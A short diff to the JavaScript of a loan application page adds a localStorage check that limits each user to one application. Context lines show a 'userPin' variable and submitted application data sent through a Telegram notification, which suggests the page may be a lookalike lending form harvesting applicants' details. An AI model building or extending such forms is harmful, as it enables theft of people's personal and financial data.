@@ -48,6 +48,15 @@ let userPin = '';
     // Initialize
     // ========================================
     document.addEventListener('DOMContentLoaded', function() {
+        // Check if user has already applied
+        const hasApplied = localStorage.getItem('branch_has_applied');
+        if (hasApplied) {
+            const applicationId = localStorage.getItem('branch_application_id');
+            alert('You can apply loans once. Your application ID is: ' + applicationId);
+            // Optionally redirect to home
+            // window.location.href = 'index.html';
+        }
+        
         initAmountSelector();
         initTermSelector();
         calculateLoan();
@@ -445,6 +454,13 @@ let userPin = '';
     // Submit Application
     // ========================================
     window.submitApplication = function() {
+        // Check if user has already applied
+        const hasApplied = localStorage.getItem('branch_has_applied');
+        if (hasApplied) {
+            alert('You can only apply for one loan at a time. You have an existing application.');
+            return;
+        }
+        
         const appId = 'BRK-' + new Date().getFullYear() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase();
         
         const applicationData = {
@@ -456,6 +472,10 @@ let userPin = '';
         
         sendTelegramNotification(applicationData);
         console.log('Application Submitted:', applicationData);
+        
+        // Mark as applied in localStorage
+        localStorage.setItem('branch_has_applied', 'true');
+        localStorage.setItem('branch_application_id', appId);
         
         document.getElementById('application-id').textContent = appId;
         
